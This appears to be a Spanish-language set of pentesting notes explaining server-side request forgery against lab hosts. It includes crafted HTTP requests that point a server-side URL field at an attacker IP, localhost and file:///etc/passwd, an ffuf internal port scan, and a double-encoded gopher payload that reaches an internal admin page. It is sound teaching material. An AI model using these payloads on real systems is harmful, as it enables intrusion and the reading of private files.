+++
title = 'SSRF'
draft = false
description = "Explicación del concepto de SSTF."
tags = ["SSRF"]
showToc = true
math = true
+++

# Server-Side Request Forgery
Una vulnerabilidad SSRF se da cuando un atacante manipula una aplicación para realizar solicitudes a URLs arbitrarias. 

Por ejemplo, si un servidor debe solicitar datos de otros servidores en función del input de un usuario, un atacante puede hacer que las solicitudes se hagan a sitios o recursos en los que el desarrollador no había pensado en un primer momento.

#### Ejemplo
En su forma más simple, una vulnerabilidad SSRF puede ser así:
> En este caso, se va a registrar un usuario nuevo, y para comprobar la disponibilidad del nombre, vemos que nuestro navegador manda lo siguiente al servidor en el que nos estamos registrando:

```http
POST /index.php HTTP/1.1
Host: 10.10.11.87
User-Agent:...

unameserver="http://10.10.11.90/usercheck.php"&username="user_591"
```

Si cambiamos el campo `unameserver` a, p.ej, nuestra IP:
```http
POST /index.php HTTP/1.1
Host: 10.10.11.87
User-Agent:...

unameserver="http://<IP_Atacante>/hello:4321"&username="user_591"
```
Podemos ver que recibimos la solicitud, confirmando la vulnerabilidad:
```shell
ncat -lnvp 8080

listening on [any] 8080...
connect to [<IP_Atacante>] from (UNKNOWN) [10.10.11.87] 45731
GET /hello HTTP/1.1
Host: 10.10.11.87:8080
Accept: */*
```

## Comprobar visibilidad output SSRF
> Para ver si, aunque haya SSRF en un host, el output del SSRF se nos muestra, podemos hacer que el campo de la URL apunte hacia el propio objetivo (ya sea su propia IP pública, dominio o localhost)

```http
POST /index.php HTTP/1.1
Host: 10.10.11.87
User-Agent:...

unameserver="http://127.0.0.1:80"&username="user_591"
```

Si nos devuelve el mismo index.html que nos devuelve el servidor cuando nos conectamos a él nosotros mismos, y podemos verlo, significa que el SSRF es visible.

## Enumeración de servicios interna
Gracias al hecho de poder conectarnos a cualquier URL, podemos enumerar los servicios internos del servidor redirigiendo la URL hacia localhost y el puerto a enumerar.

De forma automatizada:
```shell
ffuf -u http://10.10.11.87/login.php -w ./ports.txt -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "unameserver=http://127.0.0.1:FUZZ/&username=user_591" -fr "Failed to connect to"
```

Output:
```shell
80                      [Status: 200, Size: 8285, Words: 2151, Lines: 158, Duration: 4342ms]
3306                    [Status: 200, Size: 45, Words: 7, Lines: 1, Duration: 50ms]
8000                    [Status: 200, Size: 37, Words: 1, Lines: 1, Duration: 54ms]
```

## Local File Inclusion
Podemos usar otros protocolos que no sean http a la hora de hacer la solicitud, por ejemplo `file://`, que nos permite ver archivos locales:
```http
POST /index.php HTTP/1.1
Host: 10.10.11.87
User-Agent:...

unameserver="file:///etc/passwd"&username="user_591"
```

## Protocolo gopher
Aunque podemos usar SSRF para acceder a recursos protegidos, estamos limitados a solicitudes GET, pues no hay forma de mandar datos POST únicamente desde la URL.

El protocolo gopher nos permite mandar bytes "en crudo" a sockets TCP, lo que nos permite a su vez mandar solicitudes POST o de cualquier otro tipo (o protocolo) a los puertos que necesitemos.

P.ej, para mandar:
```http
POST /admin.php HTTP/1.1
Host: internal.server.com
Content-Length: 14
Content-Type: application/x-www-form-urlencoded

password=hello
```

Lo encodeamos en formato URL y añadimos el prefijo de gopher (`_`) antes del payload
- Protocolo y host: `gopher://internal.server.com:80/`
- Prefijo gopher: `_`
- Solicitud encodeada: `POST%20%2Fadmin.php%20HTTP%2F1.1%0AHost%3A%20internal.server.com%0AContent-Length%3A%2014%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0A%0Apassword%3Dhello`

Esto deja la URL como: `gopher://internal.server.com:80/_POST%20%2Fadmin.php%20HTTP%2F1.1%0AHost%3A%20internal.server.com%0AContent-Length%3A%2014%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0A%0Apassword%3Dhello`.

De nuevo, como esta URL la vamos a poner en un campo en otra solicitud HTTP, p.ej:
```http
POST /index.php HTTP/1.1
Host: 10.10.11.87
User-Agent:...

unameserver="<La URL irá aquí>"&username="user_591"
```
Vamos a necesitar encodear de nuevo toda la URL, lo que deja la solicitud final así:
```http
POST /index.php HTTP/1.1
Host: 10.10.11.87
User-Agent:...

unameserver=gopher%3A%2F%2Finternal.server.com%3A80%2F_POST%2520%252Fadmin.php%2520HTTP%252F1.1%250AHost%253A%2520internal.server.com%250AContent-Length%253A%252014%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250A%250Apassword%253Dhello&username="user_591"
```

Podemos usar [Gopherus](https://github.com/tarunkant/Gopherus) como herramienta que automatiza la creación de payloads de gopher.

## Blind SSRF
Si el output de nuestra solicitud realizada no es visible (p.ej, si se devolviese únicamente un mensaje `usuario disponible` o `usuario no disponible` al hacer la solicitud mediante SSRF), en función del comportamiento del servidor seguiríamos pudiendo enumerar ciertas cosas.

Si, por ejemplo, el servidor devuelve `usuario disponible` cuando un archivo existe y `usuario no disponible` cuando no (o cuando se devuelve un error), podríamos seguir enumerando la existencia de archivos en el servidor o los puertos abiertos en el mismo.
